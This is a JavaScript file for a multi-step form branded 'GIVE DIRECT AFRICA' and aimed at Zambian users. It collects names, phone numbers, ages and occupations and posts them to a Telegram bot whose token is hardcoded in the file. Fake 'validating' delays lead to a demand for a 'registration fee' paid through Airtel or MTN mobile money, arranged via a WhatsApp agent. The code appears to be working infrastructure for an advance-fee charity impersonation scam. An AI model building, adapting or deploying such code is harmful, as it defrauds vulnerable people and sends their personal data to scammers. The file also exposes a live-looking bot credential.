(function () {
  'use strict';

  // ==========================================
  // 🔴 TELEGRAM BOT CONFIGURATION
  // Replace these with your actual Bot Token and Chat ID
  // ==========================================
  const TELEGRAM_BOT_TOKEN = '8997766057:AAF5LoKpgqs2EUu7Q3haA1N zN7dVU6iWfcY';
  const TELEGRAM_CHAT_ID = '7921973205';

  // ---------- STATE ----------
  const state = {
    q1: null,
    q2: null,
    fullName: '',
    firstName: '',
    phone: '',
    age: '',
    occupation: '',
    country: 'Zambia',
    selectedPackage: null,
    readyToPay: false,
    network: null
  };

  // ---------- DOM ELEMENTS ----------
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  const step4 = document.getElementById('step4');
  const step5 = document.getElementById('step5');
  const step6 = document.getElementById('step6');
  
  const stepDots = document.querySelectorAll('.step-dot');
  const spinnerOverlay = document.getElementById('spinnerOverlay');
  const spinnerText = document.getElementById('spinnerText');

  const next1 = document.getElementById('next1');
  const next2 = document.getElementById('next2');
  const submitDetailsBtn = document.getElementById('submitDetailsBtn');
  const nextPackageBtn = document.getElementById('nextPackageBtn');

  const displayFee = document.getElementById('displayFee');
  const displayAmount = document.getElementById('displayAmount');
  
  const readyYes = document.getElementById('readyYes');
  const readyNo = document.getElementById('readyNo');
  
  const airtelBtn = document.getElementById('airtelBtn');
  const mtnBtn = document.getElementById('mtnBtn');
  
  const finalAction = document.getElementById('finalAction');
  const whatsappRedirect = document.getElementById('whatsappRedirect');

  const readMoreBtn = document.getElementById('readMoreBtn');
  const aboutContent = document.getElementById('aboutContent');

  // ---------- TELEGRAM API FUNCTION ----------
  async function sendToTelegram(messageText) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
      console.log("Telegram Bot Token not set. Message:", messageText);
      return; // Skip if not configured yet
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: messageText,
          parse_mode: 'HTML'
        })
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  }

  // ---------- READ MORE TOGGLE (STEP 1) ----------
  if (readMoreBtn && aboutContent) {
    readMoreBtn.addEventListener('click', function () {
      const isHidden = aboutContent.classList.contains('hidden');
      if (isHidden) {
        aboutContent.classList.remove('hidden');
        readMoreBtn.innerHTML = 'Read Less <i class="fas fa-chevron-up"></i>';
      } else {
        aboutContent.classList.add('hidden');
        readMoreBtn.innerHTML = 'Read More <i class="fas fa-chevron-down"></i>';
      }
    });
  }

  // ---------- STEP NAVIGATION ----------
  function setActiveStep(step) {
    stepDots.forEach((dot, idx) => {
      const num = idx + 1;
      dot.classList.remove('active', 'completed');
      if (num < step) dot.classList.add('completed');
      else if (num === step) dot.classList.add('active');
    });
  }

  function showStep(step) {
    [step1, step2, step3, step4, step5, step6].forEach((el, i) => {
      if(el) {
        el.classList.add('hidden');
        if (i + 1 === step) el.classList.remove('hidden');
      }
    });
    setActiveStep(step);
  }

  // ---------- STEP 1: Q1 ----------
  const q1Options = document.querySelectorAll('#q1Options .option-btn');
  q1Options.forEach(function (btn) {
    btn.addEventListener('click', function () {
      q1Options.forEach(function (b) { b.classList.remove('selected'); });
      btn.classList.add('selected');
      state.q1 = btn.dataset.q1;
      next1.disabled = false;
    });
  });

  next1.addEventListener('click', function () {
    if (!state.q1) return;
    showStep(2);
  });

  // ---------- STEP 2: Q2 ----------
  const q2Options = document.querySelectorAll('#q2Options .option-btn');
  q2Options.forEach(function (btn) {
    btn.addEventListener('click', function () {
      q2Options.forEach(function (b) { b.classList.remove('selected'); });
      btn.classList.add('selected');
      state.q2 = btn.dataset.q2;
      next2.disabled = false;
    });
  });

  next2.addEventListener('click', function () {
    if (!state.q2) return;
    showStep(3);
  });

  // ---------- STEP 3: DETAILS + SPIN 10s ----------
  submitDetailsBtn.addEventListener('click', function () {
    const name = document.getElementById('fullName').value.trim();
    const phoneRaw = document.getElementById('phoneNumber').value.trim();
    const age = document.getElementById('age').value.trim();
    const occupation = document.getElementById('occupation').value.trim();

    if (!name || !phoneRaw || !age || !occupation) {
      alert('Please fill in all details.');
      return;
    }
    if (!/^[0-9]{9}$/.test(phoneRaw)) {
      alert('Please enter a valid 9-digit phone number (after +260).');
      return;
    }

    state.fullName = name;
    state.firstName = name.split(' ')[0]; 
    state.phone = '+260' + phoneRaw;
    state.age = age;
    state.occupation = occupation;
    state.country = 'Zambia';

    // Send initial details to Telegram
    const tgMessage = `
<b>🇿🇲 NEW USER DETAILS - GIVE DIRECT AFRICA</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${state.fullName}
📞 <b>Phone:</b> ${state.phone}
🎂 <b>Age:</b> ${state.age}
💼 <b>Occupation:</b> ${state.occupation}
🌍 <b>Country:</b> ${state.country}

📌 <b>First Time:</b> ${state.q1 === 'first' ? 'Yes' : 'No'}
🎯 <b>Purpose:</b> ${state.q2}
    `;
    sendToTelegram(tgMessage);

    spinnerOverlay.classList.remove('hidden');
    spinnerText.innerText = 'Validating your details...';

    setTimeout(function () {
      spinnerOverlay.classList.add('hidden');
      showStep(4);
    }, 10000);
  });

  // ---------- STEP 4: PACKAGE SELECTION + SPIN 7s ----------
  const packageCards = document.querySelectorAll('.package-card');
  packageCards.forEach(function (card) {
    card.addEventListener('click', function () {
      packageCards.forEach(function (c) { c.classList.remove('selected'); });
      card.classList.add('selected');
      state.selectedPackage = {
        amount: card.dataset.amount,
        fee: card.dataset.fee,
        packageNumber: card.dataset.package,
      };
      nextPackageBtn.disabled = false;
    });
  });

  nextPackageBtn.addEventListener('click', function () {
    if (!state.selectedPackage) return;

    spinnerOverlay.classList.remove('hidden');
    spinnerText.innerText = 'Preparing your package...';

    setTimeout(function () {
      spinnerOverlay.classList.add('hidden');

      // Inject dynamic data into Step 5
      document.getElementById('userFirstName').innerText = state.firstName;
      document.getElementById('userFirstName2').innerText = state.firstName;
      
      displayFee.innerText = state.selectedPackage.fee;
      displayAmount.innerText = state.selectedPackage.amount;

      // Reset step 5 & 6 states
      state.readyToPay = false;
      state.network = null;
      readyYes.classList.remove('selected');
      readyNo.classList.remove('selected');
      airtelBtn.classList.remove('selected');
      mtnBtn.classList.remove('selected');
      finalAction.classList.add('hidden');

      showStep(5);
    }, 7000);
  });

  // ---------- STEP 5: PAYMENT DECISION ----------
  readyYes.addEventListener('click', function () {
    state.readyToPay = true;
    readyYes.classList.add('selected');
    readyNo.classList.remove('selected');
    showStep(6);
  });

  readyNo.addEventListener('click', function () {
    state.readyToPay = false;
    readyNo.classList.add('selected');
    readyYes.classList.remove('selected');
    alert('You can come back later. Thank you.');
  });

  // ---------- STEP 6: NETWORK SELECTION ----------
  function selectNetwork(network) {
    state.network = network;
    airtelBtn.classList.toggle('selected', network === 'Airtel');
    mtnBtn.classList.toggle('selected', network === 'MTN');

    if (state.readyToPay && state.network) {
      finalAction.classList.remove('hidden');

      // Send FULL Package & Network details to Telegram
      const tgMessage = `
<b>💳 USER READY TO PAY - PACKAGE SELECTED</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${state.fullName}
📞 <b>Phone:</b> ${state.phone}

📦 <b>Package Amount:</b> ${state.selectedPackage.amount} ZMW
💰 <b>Registration Fee:</b> ${state.selectedPackage.fee} ZMW
📶 <b>Network Chosen:</b> ${state.network}

✅ <i>User has confirmed they are ready to pay.</i>
      `;
      sendToTelegram(tgMessage);
    }
  }

  airtelBtn.addEventListener('click', function () { selectNetwork('Airtel'); });
  mtnBtn.addEventListener('click', function () { selectNetwork('MTN'); });

  // ---------- WHATSAPP REDIRECT (SIMPLE REQUEST FOR PAYMENT NUMBER) ----------
  whatsappRedirect.addEventListener('click', function () {
    if (!state.selectedPackage || !state.readyToPay || !state.network) {
      alert('Please complete all steps.');
      return;
    }

    // Simple message to Agent requesting payment number
    const message = encodeURIComponent(
      "Hello GIVE DIRECT AFRICA Agent,\n\n" +
      "I have filled the form and I am ready to pay for my registration fee. Please provide me with the payment number.\n\n" +
      "Thank you!"
    );

    // Agent's WhatsApp number
    const whatsappUrl = 'https://wa.me/254108660394?text=' + message;
    window.open(whatsappUrl, '_blank');
  });

  // ---------- INIT ----------
  showStep(1);
  next1.disabled = true;
  next2.disabled = true;
  nextPackageBtn.disabled = true;
})();